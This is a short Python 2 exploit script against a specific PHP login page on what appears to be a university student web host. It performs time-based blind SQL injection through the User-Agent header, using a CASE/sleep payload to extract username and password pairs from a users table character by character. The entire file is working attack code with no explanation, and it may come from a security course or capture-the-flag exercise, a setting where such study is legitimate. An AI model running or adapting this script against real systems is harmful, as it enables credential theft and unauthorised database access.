import requests
import hashlib
import time
import sys

url = "http://www.csie.ntu.edu.tw/~b99902063/sql.php"
payload = {
        'username'  : 'ken' ,
        'password'  : '123'
}

waiting_time = 3

table_names = []
table_index = 0
while True:
    char_index = 1
    string = ""
    while True:
        ascii_value = -1
        while True:
            code1 = " (SELECT CASE WHEN ascii(substring((SELECT concat(username, 0x3a, password) FROM users LIMIT {}, 1), {}, 1)) > {} THEN 3 ELSE sleep({}) END) ".format(table_index, char_index, ascii_value, waiting_time)
            code2 = ""
            headers = {
                        'Client-Ip'         :   '\\',
                        'User-Agent'        :   ', ' + code1 + ') ' + code2 +' #\\',
                    }
            t1 = time.time()
            r = requests.post(url, data=payload, headers=headers)
            if time.time() - t1 > waiting_time:
                break
            ascii_value += 1

        if ascii_value == 0:
            break
        string += chr(ascii_value)
        print chr(ascii_value)
        sys.stdout.flush()
        char_index += 1
    print string
    sys.stdout.flush()
    table_index += 1
    table_names.append(string)

print table_names
